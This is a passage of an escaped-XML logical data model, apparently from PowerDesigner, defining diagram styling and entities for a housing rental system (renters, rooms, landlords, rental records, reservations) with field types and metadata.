Arial,8,N&lt;/a:FontList&gt;&lt;a:BrushStyle&gt;6&lt;/a:BrushStyle&gt;&lt;a:GradientFillMode&gt;65&lt;/a:GradientFillMode&gt;&lt;a:GradientEndColor&gt;16777215&lt;/a:GradientEndColor&gt;&lt;c:Object&gt;&lt;o:Entity Ref=&quot;o34&quot;/&gt;&lt;/c:Object&gt;&lt;/o:EntitySymbol&gt;&lt;o:EntitySymbol Id=&quot;o32&quot;&gt;&lt;a:CreationDate&gt;1618331850&lt;/a:CreationDate&gt;&lt;a:ModificationDate&gt;1618331959&lt;/a:ModificationDate&gt;&lt;a:IconMode&gt;-1&lt;/a:IconMode&gt;&lt;a:Rect&gt;((-18473,-9936), (-607,-4224))&lt;/a:Rect&gt;&lt;a:AutoAdjustToText&gt;0&lt;/a:AutoAdjustToText&gt;&lt;a:LineColor&gt;4227200&lt;/a:LineColor&gt;&lt;a:FillColor&gt;8637161&lt;/a:FillColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;STRN 0 Arial,8,NDISPNAME 0 Arial,8,NAttributes 0 Arial,8,NEntityPrimaryAttribute 0 Arial,8,UIdentifiers 0 Arial,8,NLABL 0 Arial,8,N&lt;/a:FontList&gt;&lt;a:BrushStyle&gt;6&lt;/a:BrushStyle&gt;&lt;a:GradientFillMode&gt;65&lt;/a:GradientFillMode&gt;&lt;a:GradientEndColor&gt;16777215&lt;/a:GradientEndColor&gt;&lt;a:ManuallyResized&gt;1&lt;/a:ManuallyResized&gt;&lt;c:Object&gt;&lt;o:Entity Ref=&quot;o21&quot;/&gt;&lt;/c:Object&gt;&lt;/o:EntitySymbol&gt;&lt;o:EntitySymbol Id=&quot;o29&quot;&gt;&lt;a:CreationDate&gt;1618331857&lt;/a:CreationDate&gt;&lt;a:ModificationDate&gt;1618331961&lt;/a:ModificationDate&gt;&lt;a:IconMode&gt;-1&lt;/a:IconMode&gt;&lt;a:Rect&gt;((-17982,4500), (2340,10618))&lt;/a:Rect&gt;&lt;a:AutoAdjustToText&gt;0&lt;/a:AutoAdjustToText&gt;&lt;a:LineColor&gt;16512&lt;/a:LineColor&gt;&lt;a:FillColor&gt;1422826&lt;/a:FillColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;STRN 0 Arial,8,NDISPNAME 0 Arial,8,NAttributes 0 Arial,8,NEntityPrimaryAttribute 0 Arial,8,UEntityForeignAttribute 0 Arial,8,NIdentifiers 0 Arial,8,NLABL 0 Arial,8,N&lt;/a:FontList&gt;&lt;a:BrushStyle&gt;6&lt;/a:BrushStyle&gt;&lt;a:GradientFillMode&gt;65&lt;/a:GradientFillMode&gt;&lt;a:GradientEndColor&gt;16777215&lt;/a:GradientEndColor&gt;&lt;a:ManuallyResized&gt;1&lt;/a:ManuallyResized&gt;&lt;c:Object&gt;&lt;o:Entity Ref=&quot;o35&quot;/&gt;&lt;/c:Object&gt;&lt;/o:EntitySymbol&gt;&lt;/c:Symbols&gt;&lt;/o:LogicalDiagram&gt;&lt;/c:LogicalDiagrams&gt;&lt;c:DefaultDiagram&gt;&lt;o:LogicalDiagram Ref=&quot;o5&quot;/&gt;&lt;/c:DefaultDiagram&gt;&lt;c:Entities&gt;&lt;o:Entity Id=&quot;o21&quot;&gt;&lt;a:ObjectID&gt;DA62BDB4-4F45-42B4-B9F1-24B5F8BDDC3B&lt;/a:ObjectID&gt;&lt;a:Name&gt;租客&lt;/a:Name&gt;&lt;a:Code&gt;renters&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618332260&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;40F6E014-B48E-4682-AC15-11718F891E8F&#125;DAT 1618325546&lt;/a:History&gt;&lt;c:Identifiers&gt;&lt;o:Identifier Id=&quot;o36&quot;&gt;&lt;a:ObjectID&gt;9BE124CB-12DB-4BDF-866B-68C48490FECA&lt;/a:ObjectID&gt;&lt;a:Name&gt;Identifier_1&lt;/a:Name&gt;&lt;a:Code&gt;Identifier_1&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;F965A0EE-B3E3-438F-A5E6-1538D2E7B693&#125;DAT 1618325546&lt;/a:History&gt;&lt;c:Identifier.Attributes&gt;&lt;o:EntityAttribute Ref=&quot;o37&quot;/&gt;&lt;/c:Identifier.Attributes&gt;&lt;/o:Identifier&gt;&lt;/c:Identifiers&gt;&lt;c:PrimaryIdentifier&gt;&lt;o:Identifier Ref=&quot;o36&quot;/&gt;&lt;/c:PrimaryIdentifier&gt;&lt;c:Attributes&gt;&lt;o:EntityAttribute Id=&quot;o37&quot;&gt;&lt;a:ObjectID&gt;26F2FC6F-1C19-473D-91A2-81A0340F2F3C&lt;/a:ObjectID&gt;&lt;a:Name&gt;身份证&lt;/a:Name&gt;&lt;a:Code&gt;IDNum&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;4AFE59F8-46B5-4D94-9E36-D1C0C6A93550&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:DataType&gt;VA18&lt;/a:DataType&gt;&lt;a:Length&gt;18&lt;/a:Length&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o38&quot;&gt;&lt;a:ObjectID&gt;DBDE509E-E263-4805-A8BE-E62FC958FBC5&lt;/a:ObjectID&gt;&lt;a:Name&gt;租客姓名&lt;/a:Name&gt;&lt;a:Code&gt;RenterName&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;AE9DAA19-73C6-4ED9-993D-8AC65DF80478&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:DataType&gt;VA20&lt;/a:DataType&gt;&lt;a:Length&gt;20&lt;/a:Length&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o39&quot;&gt;&lt;a:ObjectID&gt;6CA49AD3-B371-4CAE-9EEE-6F69DB732044&lt;/a:ObjectID&gt;&lt;a:Name&gt;租客电话&lt;/a:Name&gt;&lt;a:Code&gt;RenterTel&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;83591775-C27F-46DA-AB5A-FAB8C1006897&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:DataType&gt;VA11&lt;/a:DataType&gt;&lt;a:Length&gt;11&lt;/a:Length&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;/c:Attributes&gt;&lt;/o:Entity&gt;&lt;o:Entity Id=&quot;o22&quot;&gt;&lt;a:ObjectID&gt;CB63B9C2-21E7-455C-9C01-707F0B836FDB&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋&lt;/a:Name&gt;&lt;a:Code&gt;RoomInfo&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;FDB75834-3BC6-4BEF-9B44-55D93226836C&#125;DAT 1618325546&lt;/a:History&gt;&lt;c:Identifiers&gt;&lt;o:Identifier Id=&quot;o40&quot;&gt;&lt;a:ObjectID&gt;984A4691-3504-4D86-9FE0-C98DB10E2752&lt;/a:ObjectID&gt;&lt;a:Name&gt;Identifier_1&lt;/a:Name&gt;&lt;a:Code&gt;Identifier_1&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;F4555F5C-6216-4A26-9736-1CDF8EC09580&#125;DAT 1618325546&lt;/a:History&gt;&lt;c:Identifier.Attributes&gt;&lt;o:EntityAttribute Ref=&quot;o41&quot;/&gt;&lt;/c:Identifier.Attributes&gt;&lt;/o:Identifier&gt;&lt;/c:Identifiers&gt;&lt;c:PrimaryIdentifier&gt;&lt;o:Identifier Ref=&quot;o40&quot;/&gt;&lt;/c:PrimaryIdentifier&gt;&lt;c:Attributes&gt;&lt;o:EntityAttribute Id=&quot;o41&quot;&gt;&lt;a:ObjectID&gt;CA5EC088-340A-45A7-B4CE-072241623902&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋编号&lt;/a:Name&gt;&lt;a:Code&gt;房屋编号&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618327239&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;C41A4BC7-929F-4BB9-BFDA-78B0883BC246&#125;DAT 1618325546ATT DTTP&lt;/a:History&gt;&lt;a:DataType&gt;VA20&lt;/a:DataType&gt;&lt;a:Length&gt;20&lt;/a:Length&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o42&quot;&gt;&lt;a:ObjectID&gt;1661FC83-5F0F-4422-9516-3147918A8D1E&lt;/a:ObjectID&gt;&lt;a:Name&gt;房主身份证号&lt;/a:Name&gt;&lt;a:Code&gt;房主身份证号&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;5C62BF98-5A88-45D6-908F-575BE93621A6&#125;,&#123;EAB9668A-ADFE-4355-822B-2AAAEBE5E1E1&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:DataType&gt;VA18&lt;/a:DataType&gt;&lt;a:Length&gt;18&lt;/a:Length&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;a:AutoMigrated&gt;1&lt;/a:AutoMigrated&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o43&quot;&gt;&lt;a:ObjectID&gt;EFA37846-F443-4FC1-AD1B-2BAEA2725085&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋地址&lt;/a:Name&gt;&lt;a:Code&gt;房屋地址&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;FB014F6C-72FC-4D85-8E52-542C49888D04&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:DataType&gt;VA20&lt;/a:DataType&gt;&lt;a:Length&gt;20&lt;/a:Length&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o44&quot;&gt;&lt;a:ObjectID&gt;74803FDB-D08B-4FAA-901F-D59A0138416C&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋类型&lt;/a:Name&gt;&lt;a:Code&gt;房屋类型&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;0BAAB45F-E7FB-47E9-A278-62E6267EA336&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:DataType&gt;VA20&lt;/a:DataType&gt;&lt;a:Length&gt;20&lt;/a:Length&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o45&quot;&gt;&lt;a:ObjectID&gt;98CAD049-F12D-4602-A467-12AA2AB936CD&lt;/a:ObjectID&gt;&lt;a:Name&gt;每月基本房租&lt;/a:Name&gt;&lt;a:Code&gt;每月基本房租&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;19EE06BA-39BF-4617-A567-B720C2B86600&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:DataType&gt;MN&lt;/a:DataType&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o46&quot;&gt;&lt;a:ObjectID&gt;A630B2B3-B09F-4ED0-98EF-11AED810E5A7&lt;/a:ObjectID&gt;&lt;a:Name&gt;是否空闲&lt;/a:Name&gt;&lt;a:Code&gt;是否空闲&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;341C6E5B-5EC0-43B5-8BFF-E0D230BDBE25&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:DataType&gt;BL&lt;/a:DataType&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;/c:Attributes&gt;&lt;/o:Entity&gt;&lt;o:Entity Id=&quot;o23&quot;&gt;&lt;a:ObjectID&gt;EF919B87-AF4E-41BB-B583-E804ABB7E916&lt;/a:ObjectID&gt;&lt;a:Name&gt;房主信息&lt;/a:Name&gt;&lt;a:Code&gt;房主信息&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;BDD7FF53-7C2F-4368-850F-95499E1A03FD&#125;DAT 1618325546&lt;/a:History&gt;&lt;c:Identifiers&gt;&lt;o:Identifier Id=&quot;o47&quot;&gt;&lt;a:ObjectID&gt;1162082B-05E6-45CC-8D3F-55365DB024AE&lt;/a:ObjectID&gt;&lt;a:Name&gt;Identifier_1&lt;/a:Name&gt;&lt;a:Code&gt;Identifier_1&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;3AF588EE-A26C-4BC1-9E65-DC4B4985582B&#125;DAT 1618325546&lt;/a:History&gt;&lt;c:Identifier.Attributes&gt;&lt;o:EntityAttribute Ref=&quot;o48&quot;/&gt;&lt;/c:Identifier.Attributes&gt;&lt;/o:Identifier&gt;&lt;/c:Identifiers&gt;&lt;c:PrimaryIdentifier&gt;&lt;o:Identifier Ref=&quot;o47&quot;/&gt;&lt;/c:PrimaryIdentifier&gt;&lt;c:Attributes&gt;&lt;o:EntityAttribute Id=&quot;o48&quot;&gt;&lt;a:ObjectID&gt;CBE95EE6-ACB8-48B0-85BE-6E2FFDF2F578&lt;/a:ObjectID&gt;&lt;a:Name&gt;房主身份证号&lt;/a:Name&gt;&lt;a:Code&gt;房主身份证号&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;5C62BF98-5A88-45D6-908F-575BE93621A6&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:DataType&gt;VA18&lt;/a:DataType&gt;&lt;a:Length&gt;18&lt;/a:Length&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o49&quot;&gt;&lt;a:ObjectID&gt;E8F77781-36D2-4CCF-A2D9-7D8EEA976154&lt;/a:ObjectID&gt;&lt;a:Name&gt;房主姓名&lt;/a:Name&gt;&lt;a:Code&gt;房主姓名&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;E57AA531-274B-4A22-BDB2-9A52917C1A3C&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:DataType&gt;VA20&lt;/a:DataType&gt;&lt;a:Length&gt;20&lt;/a:Length&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o50&quot;&gt;&lt;a:ObjectID&gt;4D92CDC9-0F32-41F9-8240-ECC639FA7D99&lt;/a:ObjectID&gt;&lt;a:Name&gt;房主电话&lt;/a:Name&gt;&lt;a:Code&gt;房主电话&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;081D5BD8-20C5-4545-8943-2D4E9F897AE7&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:DataType&gt;VA11&lt;/a:DataType&gt;&lt;a:Length&gt;11&lt;/a:Length&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;/c:Attributes&gt;&lt;/o:Entity&gt;&lt;o:Entity Id=&quot;o24&quot;&gt;&lt;a:ObjectID&gt;E86BB117-FE30-4626-8D6A-43968DEDBF08&lt;/a:ObjectID&gt;&lt;a:Name&gt;租用记录&lt;/a:Name&gt;&lt;a:Code&gt;租用记录&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;A8F60995-E16F-403E-AEFB-70370F8C286A&#125;DAT 1618325546&lt;/a:History&gt;&lt;c:Identifiers&gt;&lt;o:Identifier Id=&quot;o51&quot;&gt;&lt;a:ObjectID&gt;D99EC3B4-7A68-445B-B441-BC196027357E&lt;/a:ObjectID&gt;&lt;a:Name&gt;Identifier_1&lt;/a:Name&gt;&lt;a:Code&gt;Identifier_1&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;0AC0CBDB-7ACA-4862-8171-53CF31A83543&#125;DAT 1618325546&lt;/a:History&gt;&lt;c:Identifier.Attributes&gt;&lt;o:EntityAttribute Ref=&quot;o52&quot;/&gt;&lt;/c:Identifier.Attributes&gt;&lt;/o:Identifier&gt;&lt;/c:Identifiers&gt;&lt;c:PrimaryIdentifier&gt;&lt;o:Identifier Ref=&quot;o51&quot;/&gt;&lt;/c:PrimaryIdentifier&gt;&lt;c:Attributes&gt;&lt;o:EntityAttribute Id=&quot;o52&quot;&gt;&lt;a:ObjectID&gt;1C0360C4-9C6F-41A1-9E37-36B6E21DFAC1&lt;/a:ObjectID&gt;&lt;a:Name&gt;租用流水号&lt;/a:Name&gt;&lt;a:Code&gt;租用流水号&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618327247&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;3840185E-0793-49E6-AF26-86AFB08D6295&#125;DAT 1618325546ATT DTTP&lt;/a:History&gt;&lt;a:DataType&gt;VA20&lt;/a:DataType&gt;&lt;a:Length&gt;20&lt;/a:Length&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o53&quot;&gt;&lt;a:ObjectID&gt;A18EE4DB-AC3F-4EE4-9078-A6D655EC0D3E&lt;/a:ObjectID&gt;&lt;a:Name&gt;身份证&lt;/a:Name&gt;&lt;a:Code&gt;IDNum&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;4AFE59F8-46B5-4D94-9E36-D1C0C6A93550&#125;,&#123;40788EEB-C543-4C66-8BC9-4C0CE4D0A1B2&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:DataType&gt;VA18&lt;/a:DataType&gt;&lt;a:Length&gt;18&lt;/a:Length&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;a:AutoMigrated&gt;1&lt;/a:AutoMigrated&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o54&quot;&gt;&lt;a:ObjectID&gt;6805B1D7-CF61-4125-92E0-F009F777C701&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋编号&lt;/a:Name&gt;&lt;a:Code&gt;房屋编号&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;C41A4BC7-929F-4BB9-BFDA-78B0883BC246&#125;,&#123;B74ABDAE-7F8E-4DAA-BECE-67686B380E54&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:DataType&gt;I&lt;/a:DataType&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;a:AutoMigrated&gt;1&lt;/a:AutoMigrated&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o55&quot;&gt;&lt;a:ObjectID&gt;9F13D567-7EA5-4065-A065-8E8DFC666691&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋租用时间&lt;/a:Name&gt;&lt;a:Code&gt;房屋租用时间&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;16C1834F-749B-4CBC-87BB-34D791C4BC51&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:DataType&gt;D&lt;/a:DataType&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o56&quot;&gt;&lt;a:ObjectID&gt;9446978F-9C5B-4103-A6CA-589CB856D7E5&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋到期时间&lt;/a:Name&gt;&lt;a:Code&gt;房屋到期时间&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;23C95933-4790-4780-BCBE-99A70D53756E&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:DataType&gt;D&lt;/a:DataType&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o57&quot;&gt;&lt;a:ObjectID&gt;03F00C02-4440-4501-8A4C-AFD5198963AF&lt;/a:ObjectID&gt;&lt;a:Name&gt;付款金额&lt;/a:Name&gt;&lt;a:Code&gt;付款金额&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;9987D7A0-E0AA-4A05-94F0-E40C4B20B4E9&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:DataType&gt;MN&lt;/a:DataType&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;/c:Attributes&gt;&lt;/o:Entity&gt;&lt;o:Entity Id=&quot;o25&quot;&gt;&lt;a:ObjectID&gt;18E366E1-5EF1-4DA5-82EF-C03D77659F1B&lt;/a:ObjectID&gt;&lt;a:Name&gt;预定&lt;/a:Name&gt;&lt;a:Code&gt;预定&lt;/a:Code&gt;&lt;a:CreationDate&gt;0&lt;/a:CreationDate&gt;&lt;a:Creator/&gt;&lt;a:ModificationDate&gt;1618327266&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;D4FD4412-8743-4AEA-B773-42465813A721&#125;DAT 1618325546&lt;/a:History&gt;&lt;c:Identifiers&gt;&lt;o:Identifier Id=&quot;o58&quot;&gt;&lt;a:ObjectID&gt;A0CECD01-9346-465F-BCE4-007383CC147F&lt;/a:ObjectID&gt;&lt;a:Name&gt;Identifier_1&lt;/a:Name&gt;&lt;a:Code&gt;Identifier_1&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618327225&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Identifier.Attributes&gt;&lt;o:EntityAttribute Ref=&quot;o59&quot;/&gt;&lt;/c:Identifier.Attributes&gt;&lt;/o:Identifier&gt;&lt;/c:Identifiers&gt;&lt;c:PrimaryIdentifier&gt;&lt;o:Identifier Ref=&quot;o58&quot;/&gt;&lt;/c:PrimaryIdentifier&gt;&lt;c:Attributes&gt;&lt;o:EntityAttribute 